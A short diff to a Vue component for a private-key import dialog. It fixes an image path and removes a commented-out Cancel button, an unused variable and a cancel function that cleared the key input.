@@ -233,7 +233,7 @@
           >
             <div class="flex flex-col items-center gap-3 py-6 w-full">
               <div class="flex items-center justify-center">
-                <img src="/public/images/olx.png" class="w-20 h-20" alt=""></img>
+                <img src="/images/olx.png" class="w-20 h-20" alt=""></img>
               </div>
 
               <h2 class="text-4xl text-black mt-2 mb-0 text-center font-bold">
@@ -429,12 +429,7 @@
 
               <!-- Action Buttons -->
               <div class="flex gap-3 mt-[90px]">
-                <!-- <button
-                  @click="cancelImport"
-                  class="flex-1 bg-gray-200 text-gray-900 py-4 border-none hover:border-none hover:bg-gray-300 rounded-[30px] font-bold transition-colors duration-200"
-                >
-                  Cancel
-                </button> -->
+                
                 <button
                   @click="confirmPrivateKey"
                   :disabled="isLoading || !privateKeyInput.trim()"
@@ -493,7 +488,6 @@ import axios from "axios";
 
 const emit = defineEmits(["close"]);
 const currentStep = ref(1);
-const subStep = ref(1);
 const password = ref("");
 const isLoading = ref(false);
 const progress = ref(0);
@@ -661,10 +655,6 @@ async function confirmPrivateKey() {
   }
 }
 
-function cancelImport() {
-  // Reset private key input when canceling
-  privateKeyInput.value = "";
-}
 
 function showMessage(text, type = "success") {
   message.value = { text, type };
